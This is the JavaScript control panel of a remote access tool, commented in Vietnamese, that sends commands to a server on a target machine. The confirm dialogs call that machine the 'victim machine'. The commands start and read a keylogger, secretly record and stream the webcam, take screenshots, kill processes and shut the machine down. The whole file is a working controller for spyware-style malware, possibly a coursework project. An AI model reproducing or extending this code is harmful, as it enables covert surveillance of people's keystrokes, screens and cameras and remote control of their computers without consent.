/* -------------------------
   GLOBALS & HELPERS
   ------------------------- */
let IP = "";            // IP của máy Server
let localOnCamStream = null;

// Hàm hiển thị thông báo Toast
function showToast(text, type = "success"){
    const cont = document.getElementById("toast-container");
    const t = document.createElement("div");
    t.className = "toast " + (type === "success" ? "" : "error");
    t.innerHTML = (type === "success" ? '<i class="fa-solid fa-circle-check"></i> ' : '<i class="fa-solid fa-triangle-exclamation"></i> ') + text;
    cont.appendChild(t);
    setTimeout(()=> { t.remove(); }, 4000);
}

// Hàm gửi lệnh POST tới Server C++
async function postControl(payload){
    if(!IP) throw new Error("not-connected");
    const url = `http://${IP}:8080/control`;
    
    // Thêm timeout để không bị treo nếu mạng lag
    const controller = new AbortController();
    const id = setTimeout(() => controller.abort(), 5000); // 5s timeout

    try {
        const res = await fetch(url, {
            method: "POST",
            headers: {'Content-Type':'application/json'},
            body: JSON.stringify(payload),
            signal: controller.signal
        });
        clearTimeout(id);
        if(!res.ok) throw new Error("Server error: " + res.status);
        return res.text();
    } catch (error) {
        clearTimeout(id);
        throw error;
    }
}

/* -------------------------
   CONNECTION LOGIC
   ------------------------- */
document.getElementById('btnConnect').addEventListener('click', async ()=>{
    const ipInput = document.getElementById('ipInput');
    const ip = ipInput.value.trim();
    const statusDiv = document.getElementById('connectStatus');

    // Validate IP
    if(!/^(25[0-5]|2[0-4]\d|[01]?\d?\d)\.(25[0-5]|2[0-4]\d|[01]?\d?\d)\.(25[0-5]|2[0-4]\d|[01]?\d?\d)\.(25[0-5]|2[0-4]\d|[01]?\d?\d)$/.test(ip)){
        showToast("Địa chỉ IP không hợp lệ!", "error"); 
        return;
    }

    try {
        showToast("Đang kết nối tới " + ip + "...", "warning");
        statusDiv.innerHTML = `<i class="fa-solid fa-spinner fa-spin"></i> Connecting...`;
        
        // Ping kiểm tra
        const pingRes = await fetch(`http://${ip}:8080/ping`, {method:'GET'});
        if(!pingRes.ok) throw new Error("Ping thất bại");
        
        // Nếu thành công
        IP = ip;
        statusDiv.innerHTML = `<i class="fa-solid fa-wifi"></i> Connected: ${IP}`;
        statusDiv.style.background = "#064e3b"; // Xanh đậm
        statusDiv.style.color = "#34d399";       // Xanh sáng
        statusDiv.style.border = "1px solid #059669";
        
        // Ẩn nút Connect, hiện nút Disconnect
        document.getElementById('btnConnect').style.display = 'none';
        document.getElementById('btnDisconnect').style.display = 'inline-block';
        ipInput.disabled = true;

        showToast("Kết nối thành công! Server đang sẵn sàng.");

    } catch(e){
        IP = "";
        statusDiv.innerHTML = `<i class="fa-solid fa-circle-xmark"></i> Connection Failed`;
        statusDiv.style.color = "#f87171";
        showToast("Không thể kết nối! Hãy kiểm tra IP hoặc Tường lửa máy Server.", "error");
        console.error(e);
    }
});

document.getElementById('btnDisconnect').addEventListener('click', ()=>{
    IP = "";
    const statusDiv = document.getElementById('connectStatus');
    statusDiv.innerHTML = `<i class="fa-solid fa-circle-xmark"></i> Disconnected`;
    statusDiv.style.background = "#334155";
    statusDiv.style.color = "#94a3b8";
    statusDiv.style.border = "none";

    document.getElementById('btnConnect').style.display = 'inline-block';
    document.getElementById('btnDisconnect').style.display = 'none';
    document.getElementById('ipInput').disabled = false;
    
    showToast("Đã ngắt kết nối.");
});

/* -------------------------
   COMMAND HANDLER
   ------------------------- */
window.sendCommand = async function(cmd){
    try {
        switch(cmd){
            // --- APP & PROCESS ---
            case 'listApp': 
                const listApp = await postControl({command:'listApp'});
                document.getElementById('appList').innerText = listApp;
                break;
            
            case 'startApp':
                const appName = document.getElementById('appName').value.trim();
                if(!appName) return showToast('Chưa nhập tên App', 'error');
                await postControl({command:'startApp', name: appName});
                showToast(`Đã gửi lệnh mở: ${appName}`);
                break;

            case 'stopApp':
                const appStop = document.getElementById('appName').value.trim();
                await postControl({command:'stopApp', name: appStop});
                showToast('Đã gửi lệnh đóng App');
                break;

            case 'listProcess':
                const listProc = await postControl({command:'listProcess'});
                document.getElementById('processList').innerText = listProc;
                break;

            case 'stopProcess':
                const procName = document.getElementById('processName').value.trim();
                if(!procName) return showToast('Chưa nhập PID/Tên Process', 'error');
                const resProc = await postControl({command:'stopProcess', name: procName});
                showToast(resProc.includes("Loi") ? resProc : "Đã diệt Process thành công", resProc.includes("Loi") ? "error" : "success");
                break;

            // --- SCREENSHOT ---
            case 'screenshot': {
                showToast("Đang chụp màn hình...", "warning");
                const path = await postControl({command:'screenshot'});
                
                // Fix cache bằng timestamp
                const ts = new Date().getTime();
                const fullUrl = `http://${IP}:8080${path}?t=${ts}`;
                
                const html = `
                    <div style="display: flex; flex-direction: column; align-items: center; gap: 15px;">
                        <img src="${fullUrl}" 
                             style="max-height: 60vh; width: auto; max-width: 100%; border: 2px solid #475569; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.5);">
                        <a href="${fullUrl}" download="screenshot_${ts}.png">
                            <button class="action-btn btn-green" style="padding: 10px 30px;">
                                <i class="fa-solid fa-download"></i> TẢI ẢNH GỐC
                            </button>
                        </a>
                    </div>`;
                document.getElementById('screenshotResult').innerHTML = html;
                showToast("Đã nhận ảnh mới nhất!");
                break;
            }

            // --- WEBCAM RECORD ---
            case 'recordWebcam': {
                const sec = document.getElementById('recSeconds').value;
                showToast(`Đang quay video trong ${sec} giây...`, "warning");
                
                const path = await postControl({command:'recordWebcam', seconds: sec});
                
                if(path.includes("Loi")) {
                    showToast(path, "error");
                } else {
                    const fullUrl = `http://${IP}:8080${path}`;
                    document.getElementById('recordResult').innerHTML = `
                        <div style="color: #10b981; margin-bottom: 10px;">✅ Quay thành công!</div>
                        <a href="${fullUrl}" target="_blank">
                            <button class="action-btn btn-primary"><i class="fa-solid fa-play"></i> Xem / Tải Video</button>
                        </a>
                    `;
                    showToast("Quay xong! Hãy tải video.");
                }
                break;
            }

            // --- KEYLOGGER ---
            case 'startKeylogger':
                await postControl({command:'startKeylogger'});
                showToast("Keylogger đã bắt đầu theo dõi");
                break;
            case 'stopKeylogger':
                await postControl({command:'stopKeylogger'});
                showToast("Đã dừng Keylogger");
                break;
            case 'getKeylog':
                const logs = await postControl({command:'getKeylog'});
                document.getElementById('keylogResult').innerText = logs;
                showToast("Đã cập nhật Log");
                break;

            // --- SYSTEM ---
            case 'shutdown':
                if(confirm("Bạn có chắc chắn muốn TẮT máy nạn nhân?")) {
                    await postControl({command:'shutdown'});
                    showToast("Đã gửi lệnh Shutdown!", "error");
                }
                break;
            case 'restart':
                if(confirm("Khởi động lại máy nạn nhân?")) {
                    await postControl({command:'restart'});
                    showToast("Đã gửi lệnh Restart!", "warning");
                }
                break;
        }
    } catch(err){
        if(err.message === 'not-connected'){
            showToast('Vui lòng kết nối trước!', 'error');
        } else {
            showToast('Lỗi: ' + err.message, 'error');
        }
    }
};

/* -------------------------
   WEBCAM STREAMING
   ------------------------- */
function startOnWebcam(){
    const container = document.getElementById('onWebcamContainer');
    
    // Nếu ĐÃ kết nối Server -> Dùng luồng MJPEG từ Server
    if(IP) {
        const mjpegUrl = `http://${IP}:8080/camera`;
        container.innerHTML = `
            <img id="mjpegStream" src="${mjpegUrl}" 
                 style="width: 100%; height: 100%; object-fit: contain; border-radius: 8px;">
        `;
        showToast("Đang nhận dữ liệu từ Camera Server...");
    } 
    // Nếu CHƯA kết nối -> Dùng Local Demo (Tránh người dùng tưởng lỗi)
    else {
        startLocalDemo();
    }
}

function stopOnWebcam(){
    const container = document.getElementById('onWebcamContainer');
    container.innerHTML = '<span style="color: #64748b;">Màn hình Camera</span>';
    
    // Dừng local stream nếu có
    if(localOnCamStream){
        localOnCamStream.getTracks().forEach(t => t.stop());
        localOnCamStream = null;
    }
    
    // Đối với Server MJPEG, chỉ cần xóa thẻ img là trình duyệt tự ngắt kết nối socket
    showToast("Đã tắt màn hình Camera.");
}

async function startLocalDemo(){
    try {
        localOnCamStream = await navigator.mediaDevices.getUserMedia({video: true});
        const container = document.getElementById('onWebcamContainer');
        const video = document.createElement('video');
        video.autoplay = true;
        video.style.width = "100%";
        video.style.height = "100%";
        video.style.borderRadius = "8px";
        video.srcObject = localOnCamStream;
        
        container.innerHTML = "";
        container.appendChild(video);
        
        showToast("⚠️ Chưa kết nối Server! Đang dùng Camera của BẠN để demo.", "warning");
    } catch(e) {
        showToast("Không thể mở Camera demo: " + e.message, "error");
    }
}